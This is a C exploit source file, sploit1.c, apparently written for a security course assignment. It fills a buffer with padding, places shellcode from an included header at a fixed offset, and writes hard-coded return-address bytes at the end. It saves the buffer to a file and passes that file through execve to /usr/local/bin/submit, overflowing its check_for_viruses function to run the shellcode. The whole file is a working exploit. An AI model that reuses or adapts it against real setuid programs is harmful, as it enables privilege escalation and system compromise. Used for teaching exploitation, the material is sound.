/*
 * sploit1.c
 * buffer overflow version, attack the check_for_viruses function
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit" // or submitV2
#define FILE_NAME "file.txt"

int main() {
    FILE *fp;
	char *args[4];
	char *env[1];
    unsigned char argbuf[4017]; // 1024 for buffer, 4 for ebp, 4 for eip
    unsigned char mod[] = "\xa8\x0f\x00\x00\xa4\x0f\x00\x00\x98\xde\xbf\xff\xa4\xd0\xbf\xff";

    size_t i, len;
    char *ptr;

    // create the argbuf
    memset(argbuf, '.', sizeof(unsigned char)*4016);

    ptr = argbuf + 984;
    memcpy(ptr, shellcode, strlen(shellcode));

    ptr = argbuf + 4000;
    memcpy(ptr, mod, 16);

    fp = fopen("file.txt", "wb");
    fwrite(argbuf, 1, sizeof(argbuf), fp);
    fclose(fp);

	args[0] = TARGET;
	args[1] = "file.txt"; 
    args[2] = NULL;
    args[3] = NULL;

	env[0] = NULL;

	if(execve(TARGET, args, env) < 0){
        fprintf(stderr, "execve failed\n");
    }

	
	return 1;
}
